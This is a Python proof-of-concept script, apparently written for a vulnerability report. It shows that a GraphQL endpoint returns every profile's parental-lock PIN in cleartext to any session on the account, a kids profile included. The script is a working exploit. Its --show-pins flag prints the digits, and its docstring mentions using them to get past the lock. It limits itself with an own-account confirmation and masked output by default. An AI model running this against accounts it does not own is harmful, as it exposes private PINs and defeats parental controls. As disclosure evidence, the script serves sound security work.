#!/usr/bin/env python3
"""Read every profile's Profile-Lock PIN from a session you own.

One request. The response carries `lockPin` for every profile on the account,
whatever profile the session is currently on -- including a kids profile.

    python3 poc/lockpin_read.py --cookies cookies.txt --confirm-own-account
    python3 poc/lockpin_read.py --cookies cookies.txt --confirm-own-account --show-pins
    python3 poc/lockpin_read.py --no-cookie --confirm-own-account      # negative control

The PIN is masked as `set (4 chars)` unless --show-pins is passed. Presence in
the response is the finding; the digits are only needed if you are walking the
gate afterwards.
"""
import argparse
import json
import sys

import profiles


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--cookies", help="one-line cookie string exported from your browser")
    ap.add_argument("--no-cookie", action="store_true",
                    help="send the same request with no session cookie (negative control)")
    ap.add_argument("--show-pins", action="store_true", help="print the digits, not just presence")
    ap.add_argument("--json", action="store_true", help="print the redacted body as JSON")
    ap.add_argument("--confirm-own-account", action="store_true")
    args = ap.parse_args()

    profiles.require_own_account(args.confirm_own_account)
    if not args.cookies and not args.no_cookie:
        sys.exit("need --cookies <file> (or --no-cookie for the control)")

    cookie_string = "" if args.no_cookie else profiles.read_cookie_file(args.cookies)

    print(f"session profile (pg): {profiles.pg_of(cookie_string) or '<none>'}")
    name, op_id, version = profiles.LOCK_TEMPLATE
    status, headers, text = profiles.graphql(name, op_id, {}, version, cookie_string)
    print(f"POST /graphql  {name}  v{version}  ->  HTTP {status}")
    print(f"access-control-allow-origin: {headers.get('access-control-allow-origin')}")
    print(f"access-control-allow-credentials: {headers.get('access-control-allow-credentials')}")

    try:
        doc = json.loads(text)
    except ValueError:
        print(text[:800])
        return 1

    for err in doc.get("errors") or []:
        print(f"error: {err.get('message')}  (origin: {err.get('extensions', {}).get('origin')})")

    account = (doc.get("data") or {}).get("growthAccount")
    if not account:
        print("growthAccount: null -- no account behind this request")
        return 0

    rows = account.get("profiles") or []
    current = (doc.get("data") or {}).get("currentProfile") or {}
    print(f"\ncurrentProfile: {str(current.get('guid'))[:8]}... "
          f"kids={current.get('isKids')} owner={current.get('isAccountOwner')}")
    print(f"profiles returned: {len(rows)}\n")

    with_pin = 0
    for row in rows:
        lock = row.get("lockPin")
        if lock:
            with_pin += 1
        shown = lock if (args.show_pins and lock) else profiles.pin(lock)
        flag = "  <-- populated in cleartext" if lock else ""
        print(f"  {str(row.get('guid'))[:8]}...  {str(row.get('name'))[:16]:<16}  "
              f"lockPin={shown}{flag}")

    print(f"\n{with_pin} of {len(rows)} profiles returned a PIN to this session "
          f"({current.get('name') or 'unknown profile'}).")
    if args.json:
        redacted = {
            "data": {
                "currentProfile": {
                    "guid": str(current.get("guid"))[:8],
                    "isKids": current.get("isKids"),
                    "isAccountOwner": current.get("isAccountOwner"),
                },
                "growthAccount": {
                    "profiles": [
                        {
                            "guid": str(p.get("guid"))[:8],
                            "name": p.get("name"),
                            "isKids": p.get("isKids"),
                            "isAccountOwner": p.get("isAccountOwner"),
                            "lockPin": (p.get("lockPin") if args.show_pins or not p.get("lockPin")
                                        else profiles.pin(p.get("lockPin"))),
                        }
                        for p in rows
                    ]
                },
            }
        }
        print(json.dumps(redacted, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
